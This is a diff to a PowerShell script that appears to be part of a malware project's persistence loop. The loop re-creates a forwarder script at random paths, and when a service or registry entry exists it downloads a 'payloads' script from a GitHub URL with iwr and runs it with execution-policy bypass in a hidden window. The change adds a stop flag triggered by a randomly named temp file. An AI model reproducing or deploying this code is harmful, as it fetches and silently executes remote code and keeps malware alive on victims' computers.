@@ -65,11 +65,15 @@ function Get-ServiceName{
 
 
 
-
+$stop = $false
 while ($true) {
     $x = Get-ServiceReg -path $regPath
     $y = Get-ServiceName -name $serviceName
-    if(-not(Test-Path -Path $fwdPath -PathType Leaf)){
+    if(Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf){
+        $stop = $true
+        Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
+    }
+    if(-not(Test-Path -Path $fwdPath -PathType Leaf) -and -not($stop)){
         if(-not($issetup)){
             $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $fwdPath = "$fwdPath\f.ps1"
@@ -83,6 +87,7 @@ while ($true) {
     elseif($x -or $y){
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
         powershell.exe -ep bypass -noP -w hidden $initServicefwdPath -basePath "$b" -fwdPath $fwdPath
+        $stop = $false
     }
     $issetup = $false
 }
